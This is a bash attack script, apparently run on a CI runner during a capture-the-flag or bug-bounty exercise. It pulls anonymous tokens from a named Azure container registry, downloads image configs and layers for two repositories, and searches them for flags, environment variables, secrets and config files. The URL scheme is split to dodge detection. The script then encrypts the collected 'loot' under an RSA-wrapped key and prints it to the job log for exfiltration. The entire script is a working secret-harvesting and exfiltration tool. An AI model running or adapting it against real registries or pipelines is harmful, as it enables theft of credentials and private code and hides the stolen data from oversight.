#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
SC="htt""ps://"
ACR=crtblplatprodx3euoz.azurecr.io
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
ACC='application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json'
for R in catalog-api tebamoto-reporting-api; do
  say "############ REPO $R"
  T=$(curl -sS "${SC}${ACR}/oauth2/token?service=${ACR}&scope=repository:${R}:pull" | jq -r '.access_token // empty')
  IDX=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/latest")
  for CH in $(echo "$IDX" | jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest'); do
    CM=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${CH}")
    CFG=$(echo "$CM" | jq -r '.config.digest // empty')
    say "==== $R CONFIG $CFG ===="
    curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${CFG}" -o /tmp/cfg.json
    say "CFG-SIZE=$(wc -c </tmp/cfg.json)"
    say "$(grep -aoE 'flag\{[^}]{0,160}\}|FLAG\{[^}]{0,160}\}' /tmp/cfg.json | head)"
    say "CFG-HISTORY: $(jq -c '[.history[]?.created_by]' /tmp/cfg.json 2>/dev/null | head -c 2000)"
    say "CFG-ENV: $(jq -c '.config.Env // .config.env // []' /tmp/cfg.json 2>/dev/null | head -c 2000)"
    for L in $(echo "$CM" | jq -r '.layers[]?.digest'); do
      curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${L}" -o /tmp/L.tgz
      SZ=$(wc -c </tmp/L.tgz)
      say "---- LAYER $L size=$SZ ----"
      if [ "$SZ" -lt 4000 ]; then say "  RAW: $(cat /tmp/L.tgz | tr -d '\000' | head -c 1200)"; fi
      tar -tzf /tmp/L.tgz 2>/dev/null | grep -iE 'flag|app\.py|config|secret|\.json$|\.env' | head -20 | sed 's/^/  f: /'
      tar -xzf /tmp/L.tgz -O 2>/dev/null | grep -aoiE 'flag\{[^}]{0,160}\}|FLAG\{[^}]{0,160}\}|flag[=:_ "]{1,3}[A-Za-z0-9_{}.-]{4,120}' | head -20 | sed 's/^/  HIT: /'
    done
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
